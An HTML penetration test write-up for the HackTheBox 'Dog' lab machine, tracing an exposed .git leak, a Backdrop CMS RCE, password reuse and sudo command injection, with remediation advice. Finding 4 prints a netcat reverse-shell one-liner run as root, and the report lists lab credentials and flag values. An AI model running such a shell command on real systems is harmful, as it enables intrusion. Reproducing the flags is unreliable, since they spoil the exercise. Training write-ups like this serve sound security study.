<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Testing Report - Dog</title>
    <style>
        /* --- Universal Styles for Screen and Print --- */
        body {
            background-color: #0a4b63; /* Dark Teal Background */
            color: #f0f0f0; /* Off-white text for readability */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            /* ** Crucial for forcing background colors in print ** */
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact;
        }
        .container {
            max-width: 900px;
            margin: 40px auto;
            padding: 20px 40px;
            background-color: #0c5975;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        h1, h2, h3, h4 {
            color: #ffffff;
            border-bottom: 1px solid #2a9d8f;
            padding-bottom: 10px;
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            padding: 20px 0;
            border-top: 3px solid #93c47d; /* Green accent line */
            border-bottom: 3px solid #93c47d; /* Green accent line */
            margin-bottom: 5px;
        }
        h2.subtitle {
             text-align: center;
             font-size: 1.8em;
             border: none;
             margin-top: 0;
             margin-bottom: 5px;
        }
        h3.report-meta {
            text-align: center;
            font-size: 1.2em;
            border: none;
            margin-top: 0;
            margin-bottom: 5px;
        }
        hr {
            border: 0;
            height: 1px;
            background-color: #2a9d8f;
            margin: 30px 0;
        }
        .confidential {
            text-align: center;
            margin: 20px 0;
        }
        .confidential strong {
            font-size: 1.1em;
        }
        .confidential em {
            font-size: 0.9em;
            color: #cccccc;
        }
        a {
            color: #93c47d; /* Green accent for links */
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        ul, ol {
            padding-left: 20px;
        }
        li {
            margin-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border: 1px solid #1a7469;
        }
        thead {
            background-color: #93c47d; /* Green accent for table headers */
            color: #0a4b63;
            /* ** Crucial for forcing background colors in print ** */
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact;
        }
        thead th {
             font-weight: bold;
        }
        tbody tr:nth-child(even) {
            background-color: #0a4b63; /* Striped rows */
        }
        pre {
            background-color: #002b36; /* Darker background for code */
            color: #cddc39; /* Lime green text for code */
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #1a7469;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        code {
            font-family: 'Courier New', Courier, monospace;
        }
        .footer {
             text-align: center;
             margin-top: 40px;
             font-style: italic;
             color: #cccccc;
        }
        
        /* This rule helps control the margins set by the browser's print function */
        @page {
            margin: 0.75in;
        }

    </style>
</head>
<body>

    <div class="container">

        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
        <h2 class="subtitle">Report of Findings: Dog</h2>
        <h3 class="report-meta">Date: March 9, 2025</h3>
        <h3 class="report-meta">Version: 1.0</h3>

        <div class="confidential">
            <strong>CONFIDENTIAL</strong><br>
            <em>For educational and training purposes only</em>
        </div>

        <hr>
        
        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
        <ol>
            <li><a href="#executive-summary">Executive Summary</a></li>
            <li><a href="#technical-summary">Technical Summary</a></li>
            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
            <li><a href="#attack-timeline">Attack Timeline</a></li>
            <li><a href="#port-scan">Port Scan Results</a></li>
            <li><a href="#remediation">Remediation Recommendations</a></li>
            <li><a href="#evidence">Evidence Files</a></li>
            <li><a href="#conclusion">Conclusion</a></li>
        </ol>

        <hr>

        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
        <p>A penetration test was conducted on the HTB Dog machine (10.10.11.58). The assessment revealed a critical chain of vulnerabilities stemming from an exposed `.git` repository in the web root. Analysis of this repository led to the discovery of administrator credentials for the Backdrop CMS. These credentials were used to exploit a known authenticated Remote Command Execution (RCE) vulnerability. Further lateral movement was achieved through password reuse, and finally, privilege escalation to root was accomplished by exploiting a command injection vulnerability in a custom script with `sudo` permissions.</p>
        
        <h3>Key Findings Summary</h3>
        <ul>
            <li><strong>4 critical vulnerabilities</strong> chained for full system compromise.</li>
            <li><strong>Complete system compromise</strong> achieved (user and root).</li>
            <li><strong>Information Disclosure</strong> via an exposed `.git` directory leaking credentials.</li>
            <li><strong>Authenticated RCE</strong> in Backdrop CMS version 1.27.1.</li>
            <li><strong>Password Reuse</strong> allowing for lateral movement to a user with `sudo` privileges.</li>
            <li><strong>Privilege Escalation</strong> through a command injection flaw in a custom `sudo` utility.</li>
        </ul>

        <h3>Risk Level: CRITICAL</h3>
        <p>The system is critically vulnerable due to multiple, severe misconfigurations. The exposed version control repository provides a direct path to credential compromise, and the subsequent flaws in the CMS and `sudo` configuration allow for a straightforward escalation to full administrative control.</p>

        <hr>

        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
        
        <h3>Target Information</h3>
        <ul>
            <li><strong>Target IP:</strong> 10.10.11.58</li>
            <li><strong>Attacker IP:</strong> 10.10.14.22</li>
            <li><strong>Hostname:</strong> dog.htb</li>
            <li><strong>Operating System:</strong> Ubuntu 20.04.6 LTS</li>
        </ul>

        <h3>Attack Vector Summary</h3>
        <ol>
            <li><strong>Initial Access:</strong> An exposed `.git` repository in the web root was cloned. Analysis of the commit history and configuration files revealed valid credentials for the Backdrop CMS. These credentials were then used with a known public exploit for Backdrop CMS 1.27.1 to achieve authenticated Remote Command Execution (RCE).</li>
            <li><strong>Lateral Movement:</strong> The compromised CMS password was successfully reused to authenticate as the system user `johncusack` via SSH.</li>
            <li><strong>Privilege Escalation:</strong> The user `johncusack` had `sudo` privileges to run a custom utility named `/usr/local/bin/bee`. This utility was vulnerable to command injection via its `eval` parameter, allowing for arbitrary commands to be executed as the root user.</li>
        </ol>

        <hr>

        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>

        <h3>Finding 1: Exposed `.git` Repository Leading to Credential Disclosure</h3>
        <p><strong>Severity:</strong> CRITICAL<br>
        <strong>CVSS Score:</strong> 9.1<br>
        <strong>CWE:</strong> CWE-552 (Files or Directories Accessible to External Parties)</p>
        <p><strong>Description:</strong><br>
        The web server at `http://10.10.11.58/` has an exposed `.git` directory. This allows an attacker to download the entire source code repository, including commit history, branches, and sensitive configuration files that may have been committed. Analysis of the git repository's contents revealed valid credentials for the user `tiffany`.</p>
        <p><strong>Technical Details:</strong></p>
        <ul>
            <li><strong>Vulnerable Endpoint:</strong> `http://10.10.11.58/.git/`</li>
            <li><strong>Information Disclosed:</strong> Full application source code and credentials.</li>
            <li><strong>Credentials Found:</strong> `tiffany@dog.htb`:`BackDropJ2024DS2024`</li>
        </ul>
        <p><strong>Impact:</strong> This misconfiguration provided the necessary credentials to bypass authentication on the Backdrop CMS, directly enabling the subsequent RCE attack.</p>

        <h3>Finding 2: Authenticated RCE in Backdrop CMS 1.27.1</h3>
        <p><strong>Severity:</strong> HIGH<br>
        <strong>CVSS Score:</strong> 8.8<br>
        <strong>CWE:</strong> CWE-94 (Improper Control of Generation of Code - 'Code Injection')</p>
        <p><strong>Description:</strong><br>
        Backdrop CMS version 1.27.1 is known to be vulnerable to authenticated Remote Command Execution. An attacker with administrative credentials (obtained from Finding 1) can exploit this vulnerability to execute arbitrary commands on the underlying server. Publicly available exploits exist for this vulnerability.</p>
        <p><strong>Technical Details:</strong></p>
        <ul>
            <li><strong>Vulnerable Component:</strong> Backdrop CMS 1.27.1</li>
            <li><strong>Prerequisite:</strong> Valid administrative credentials.</li>
        </ul>
        <p><strong>Impact:</strong> This vulnerability allowed the attacker to move from having web application access to gaining a command-line shell on the server, providing the initial foothold needed for further attacks.</p>

        <h3>Finding 3: Insecure Password Reuse</h3>
        <p><strong>Severity:</strong> HIGH<br>
        <strong>CVSS Score:</strong> 7.8<br>
        <strong>CWE:</strong> CWE-255 (Credentials Management)</p>
        <p><strong>Description:</strong><br>
        The password (`BackDropJ2024DS2024`) discovered for the CMS user `tiffany` was reused for the operating system user `johncusack`. This common but insecure practice allowed the attacker to escalate their access from a web shell to a more stable and privileged SSH session.</p>
        <p><strong>Technical Details:</strong></p>
        <ul>
            <li><strong>Username:</strong> `johncusack`</li>
            <li><strong>Reused Password:</strong> `BackDropJ2024DS2024`</li>
        </ul>
        <p><strong>Impact:</strong> Password reuse enabled lateral movement from a low-privilege web user to a system user with `sudo` capabilities, which was a critical step in the attack chain.</p>

        <h3>Finding 4: Privilege Escalation via Sudo Command Injection</h3>
        <p><strong>Severity:</strong> HIGH<br>
        <strong>CVSS Score:</strong> 8.8<br>
        <strong>CWE:</strong> CWE-78 (Improper Neutralization of Special Elements used in an OS Command - 'OS Command Injection')</p>
        <p><strong>Description:</strong><br>
        The user `johncusack` is permitted to run the script `/usr/local/bin/bee` as root via `sudo`. The script takes an `eval` argument that directly executes the provided string as a command without any sanitization. An attacker can pass a malicious payload to this argument to execute arbitrary commands with root privileges.</p>
        <p><strong>Technical Details:</strong></p>
        <ul>
            <li><strong>Vulnerable Component:</strong> Sudoers configuration for `/usr/local/bin/bee`.</li>
            <li><strong>Vulnerable Parameter:</strong> `eval`</li>
        </ul>
        <p><strong>Evidence:</strong><br>The following command was executed to spawn a reverse shell as root:</p>
        <pre><code>sudo /usr/local/bin/bee --root=/var/www/html eval 'exec("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 4444 >/tmp/f")'</code></pre>
        <p><strong>Impact:</strong> This vulnerability allows any user with access to the `johncusack` account to gain full administrative (root) control over the system, leading to a complete compromise.</p>

        <hr>

        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
        
        <h3>Phase 1: Reconnaissance</h3>
        <ul>
            <li><strong>Port Scanning:</strong> Identified SSH on port 22 and HTTP on port 80.</li>
            <li><strong>Web Enumeration:</strong> Identified Backdrop CMS and an exposed `.git` directory.</li>
        </ul>

        <h3>Phase 2: Initial Access</h3>
        <ul>
            <li><strong>Information Disclosure:</strong> Cloned the `.git` repository and analyzed its contents to find CMS credentials.</li>
            <li><strong>Authenticated RCE:</strong> Used the credentials (`tiffany:BackDropJ2024DS2024`) with a public exploit for Backdrop CMS 1.27.1 to gain a web shell.</li>
        </ul>
        
        <h3>Phase 3: Lateral Movement</h3>
        <ul>
            <li><strong>Password Reuse:</strong> Attempted to use the discovered password for the system user `johncusack`.</li>
            <li><strong>SSH Access:</strong> Successfully authenticated via SSH as `johncusack` and retrieved the user flag.</li>
        </ul>

        <h3>Phase 4: Privilege Escalation</h3>
        <ul>
            <li><strong>Sudo Enumeration:</strong> Ran `sudo -l` and identified the insecure `bee` utility permission.</li>
            <li><strong>Command Injection:</strong> Crafted a reverse shell payload and passed it to the `eval` parameter of the `bee` script.</li>
            <li><strong>Root Access:</strong> Received a root shell and retrieved the root flag.</li>
        </ul>

        <hr>
        
        <h2 id="port-scan">PORT SCAN RESULTS</h2>
        <h3>TCP Port Scan</h3>
        <pre><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-git: 10.10.11.58:80/.git/
| Git repository found!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

        <hr>
        
        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
        
        <h3>CRITICAL PRIORITY</h3>
        <ol>
            <li><strong>Remove Exposed `.git` Directory:</strong> Immediately remove the `.git` directory from the web server's document root (`/var/www/html`). Version control repositories should never be accessible to the public.</li>
            <li><strong>Patch Backdrop CMS:</strong> Update the Backdrop CMS installation to the latest stable version to mitigate the authenticated RCE and any other known vulnerabilities.</li>
            <li><strong>Fix Insecure Sudo Rule:</strong> Remove or rewrite the sudo rule for the `/usr/local/bin/bee` script. Scripts that execute user-supplied input via functions like `eval` should never be run with elevated privileges.</li>
        </ol>

        <h3>HIGH PRIORITY</h3>
        <ol>
            <li><strong>Enforce Password Policy:</strong> Implement a strict password policy that prohibits password reuse across different services (CMS, SSH, etc.). Invalidate all current user passwords and require users to set new, unique ones.</li>
            <li><strong>Credential Rotation:</strong> Immediately change the password for the `tiffany` and `johncusack` accounts.</li>
        </ol>

        <hr>

        <h2 id="evidence">EVIDENCE FILES</h2>
        
        <h3>User Flag</h3>
        <ul>
            <li><strong>Location:</strong> /home/johncusack/user.txt</li>
            <li><strong>Value:</strong> 5ba31c74c0cd1188c81fc72d7732cfe8</li>
        </ul>

        <h3>Root Flag</h3>
        <ul>
            <li><strong>Location:</strong> /root/root.txt</li>
            <li><strong>Value:</strong> fb2e3547d39656355bd99eb9631610bc</li>
        </ul>

        <h3>Key Artifacts</h3>
        <ul>
            <li><strong>Exposed Directory:</strong> `/.git/`</li>
            <li><strong>Compromised Credentials:</strong> `tiffany:BackDropJ2024DS2024`</li>
            <li><strong>Privilege Escalation Command:</strong> `sudo /usr/local/bin/bee ... eval '...'`</li>
        </ul>

        <hr>

        <h2 id="conclusion">CONCLUSION</h2>
        <p>The Dog machine was compromised due to a series of fundamental security oversights. The primary catalyst was the exposure of a `.git` repository, a critical misconfiguration that led to the unraveling of the system's security. This initial flaw enabled credential theft, which in turn allowed for the exploitation of a known software vulnerability. The situation was further exacerbated by poor password hygiene (reuse) and a dangerously configured `sudo` rule, demonstrating a lack of defense-in-depth. Each stage of the attack exploited a distinct but severe vulnerability, leading to an inevitable full system compromise.</p>
        
        <p><strong>Business Risk:</strong> CRITICAL - An unauthenticated attacker can easily gain full administrative control of the server. This could lead to a complete loss of data confidentiality and integrity, service disruption, and the use of the server as a launchpad for attacks against other assets on the network.</p>
        <p><strong>Technical Risk:</strong> The combination of information disclosure, an unpatched CMS, password reuse, and a command injection flaw creates a simple and reliable path for an attacker to escalate privileges from zero access to root.</p>
        
        <hr>

        <div class="footer">
            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
            <strong>Date:</strong> March 9, 2025</p>
            <p>CONFIDENTIAL - For educational purposes only</p>
        </div>

    </div>

</body>
</html>